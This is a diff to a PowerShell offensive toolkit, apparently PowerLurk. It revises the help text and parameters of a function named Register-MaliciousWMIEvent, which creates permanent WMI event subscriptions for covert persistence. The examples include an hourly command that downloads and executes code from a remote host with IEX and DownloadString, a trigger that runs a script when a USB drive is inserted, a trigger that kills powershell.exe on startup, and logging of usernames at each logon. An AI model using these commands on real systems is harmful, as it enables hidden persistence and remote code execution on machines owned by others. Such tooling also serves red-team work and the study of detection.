@@ -7,12 +7,12 @@ By default, Get-WmiEvent queries WMI for all __FilterToConsumerBinding instances
 
 .DESCRIPTION
 
-Default output are all instances of the __FilterToConsumerBinding class and their associated __EventFilter and 
-__EventConsumer objects.
+This function will query and return all instances of the __FilterToConsumerBinding class and their associated __EventFilter and 
+__EventConsumer objects. Parameters are present to return any combination of these instances. It is also possible to filter by name using the -Name parameter.
 
 .PARAMETER Binding
 
-Indicates that WMI filter to consumer bindings are returned. 
+Indicates that WMI _FilterToConsumerBinding instances be returned. 
 
 .PARAMETER Consumer
 
@@ -24,7 +24,7 @@ Indicates that WMI event filters are returned.
 
 .PARAMETER Name
 
-Specifies the WMI event name to return. 
+Specifies the WMI event instance name to return. 
 
 .PARAMETER ComputerName
 
@@ -95,14 +95,16 @@ This cmdlet returns System.Management.ManagementBaseObject.ManagementObject obje
     }
     if (!$Binding -and !$Consumer -and !$Filter){
         $Events = Get-WmiObject '__FilterToConsumerBinding' -Namespace root/subscription @Arguments
-        foreach($Event in $Events){
-            $Event
-            $ConsumerId = $Event.Consumer
-            $FilterId = $Event.Filter
-            $Arguments['Filter'] = "__RELPATH='$ConsumerId'"
-            Get-WmiObject -Namespace root/subscription -Class $($ConsumerId.Split('.')[0]) @Arguments
-            $Arguments['Filter'] = "__RELPATH='$FilterId'"
-            Get-WmiObject -Namespace root/subscription -Class $($FilterId.Split('.')[0]) @Arguments
+        if ($Events){
+            foreach($Event in $Events){
+                $Event
+                $ConsumerId = $Event.Consumer
+                $FilterId = $Event.Filter
+                $Arguments['Filter'] = "__RELPATH='$ConsumerId'"
+                Get-WmiObject -Namespace root/subscription -Class $($ConsumerId.Split('.')[0]) @Arguments
+                $Arguments['Filter'] = "__RELPATH='$FilterId'"
+                Get-WmiObject -Namespace root/subscription -Class $($FilterId.Split('.')[0]) @Arguments
+            }
         }
     }
     if($Binding){
@@ -117,28 +119,37 @@ This cmdlet returns System.Management.ManagementBaseObject.ManagementObject obje
 }
 
 function Register-MaliciousWMIEvent {
+
 <#
 .SYNOPSIS
 
-Registers a malicious Permanent WMI Event using predefinied triggers and a specified action.
+Registers a malicious WMI Event using predefinied triggers and a user provided action.
 
 .DESCRIPTION
 
-This cmdlet is the core of PowerLurk. It takes a command, script, or scriptblock as the action and a precanned trigger then creates the WMI Filter, Consumer, and FilterToConsumerBinding required for a fully functional Permanent WMI Event Subscription. A number of WMI event triggers, or filters, are preconfigured. The trigger must be specified with the -Trigger parameter. There are three consumers to choose from, PermanentCommand, PermanentScript, and LocalScriptBLock. Example usage: 
+This cmdlet is the core of PowerLurk. It takes a command, script, or scriptblock as the action, and a precanned trigger, then creates the WMI Filter, 
+Consumer, and FilterToConsumerBinding required for a fully functional Permanent WMI Event Subscription. A number of WMI event triggers, or filters, 
+are preconfigured. The trigger must be specified with the -Trigger parameter. There are three consumers to choose from, PermanentCommand, 
+PermanentScript, and LocalScriptBLock.
 
-.PARAMETER Command
+.PARAMETER PermanentCommand
 
 Indicates that an operating system command will be executed once the specified WMI event occurs. Provide a string or scriptblock
 containing the command you would like to run. 
 
-.PARAMETER Script
+.PARAMETER PermanentScript
 
 Indicates that a provided Jscript or VBScript will run once a WMI event occurs. Provide a string or scriptblock containing 
 the script code you would like executed.
 
+.PARAMETER LocalScriptBlock
+
+Indicates that a provided local event scriptblock be executed once a WMI event occurs.
+
 .PARAMETER Trigger
 
-Specifies the event trigger (WMI Filter) to use. The options are InsertUSB, UserLogon, ProcessStart, Interval, and Timed.
+Specifies the event trigger (WMI Filter) to use. The options are InsertUSB, UserLogon, ProcessStart, Interval, and Timed. UserLogon is an extrinisic
+event, so the event object is used with %TargetInstance.PropertyName% rather than %PropertyName% like the other instrinsic options.
 
 .PARAMETER EventName
 
@@ -172,24 +183,53 @@ The credential object used to authenticate to the remote system. If not specifie
 
 .EXAMPLE
 
-PS C:\>Register-MaliciousWmiEvent -EventName KillProc -Command "Powershell.exe -NoP -C `"Stop-Process -Id %ProcessId% -Force`"" -Trigger ProcessStart -ProcessName powershell.exe
+PS C:\>Register-MaliciousWmiEvent -EventName KillProc -PermanentCommand "Powershell.exe -NoP -C `"Stop-Process -Id %ProcessId% -Force`"" -Trigger ProcessStart -ProcessName powershell.exe
 
 
-.EXAMPLE
-
-PS C:\>Register-MaliciousWmiEvent -EventName DLThumbdrive -Script "<JScript/VBScript>" -Trigger InsertUSB
+This command creates a permanent WMI event that will kill the 'powershell.exe' process after it is started.
 
 .EXAMPLE
 
-PS C:\>Register-MaliciousWmiEvent -EventName NotifyUponLogon -Command "cmd.exe /c `"ping 192.168.50.11`"" -Trigger UserLogon -UserName administrator
+$script = @’
+Set objFSO=CreateObject("Scripting.FileSystemObject")
+outFile="c:\temp\log.txt"
+Set objFile = objFSO.CreateTextFile(outFile,True)
+objFile.Write "%TargetInstance.ProcessName% started at PID %TargetInstance.ProcessId%" & vbCrLf
+objFile.Close
+‘@
+
+PS C:\>Register-MaliciousWmiEvent -EventName KillProc -PermanentScript $script -Trigger ProcessStart -ProcessName powershell.exe
+
+
+This command creates a permanent WMI event will execute a log the process name and ID to a log file using VBScript anytime powershell.exe starts.
 
 .EXAMPLE
 
-PS C:\>Register-MaliciousWmiEvent -EventName CheckIn -Command "powershell.exe -NoP -C IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/checkin.html')" -Trigger Interval -IntervalPeriod 10000
+PS C:\>Register-MaliciousWmiEvent -EventName DLThumbdrive -PermanentScript $script -Trigger InsertUSB
+
+
+This command creates a permanent WMI event will execute a script when a new volume is added to the target system, such as a USB storage device or mapped network drive.
 
 .EXAMPLE
 
-PS C:\>Register-MaliciousWmiEvent -EventName ExecuteSystemCheck -Script "<JScript/VBScript" -Trigger Timed -ExecutionTime '07/07/2016 12:30pm'
+PS C:\>Register-MaliciousWmiEvent -EventName Logonlog -PermanentCommand "cmd.exe /c echo %TargetInstance.Antecedent% >> c:\temp\log.txt" -Trigger UserLogon -Username any
+
+
+This command creates a permanent WMI event save the Antecedent property of the target event instance, which contains the username and domain, to a log file anytime a user logs in.
+
+.EXAMPLE
+
+PS C:\>Register-MaliciousWmiEvent -EventName CheckIn -PermanentCommand "powershell.exe -NoP -C IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/checkin.html')" -Trigger Interval -IntervalPeriod 3600
+
+
+This command creates a permanent WMI event that will perform Invoke-Expression on whatever is returned after a GET request to 'http://10.10.10.10/checkin.html' every 60 minutes.
+
+.EXAMPLE
+
+PS C:\>Register-MaliciousWmiEvent -EventName ExecuteSystemCheck -PermanentScript $script -Trigger Timed -ExecutionTime '07/07/2016 12:30pm'
+
+
+This command creates a permanent WMI event execute a specified script at '07/07/2016 12:30pm'
 
 .OUTPUTS
 
@@ -240,8 +280,8 @@ By default, this cmdlet returns a System.Management.ManagementBaseObject.Managem
         [ValidateNotNullOrEmpty()]
         $ExecutionTime,
 
-        [Parameter(Mandatory = $True, ParameterSetName = 'CommandTimedSet')]
-        [Parameter(Mandatory = $True, ParameterSetName = 'LocalTimedSet')]
+        [Parameter(Mandatory = $True, ParameterSetName = 'CommandIntervalSet')]
+        [Parameter(Mandatory = $True, ParameterSetName = 'LocalIntervalSet')]
         [Parameter(Mandatory = $True, ParameterSetName = 'ScriptIntervalSet')]
         [Int32]
         [ValidateNotNullOrEmpty()]
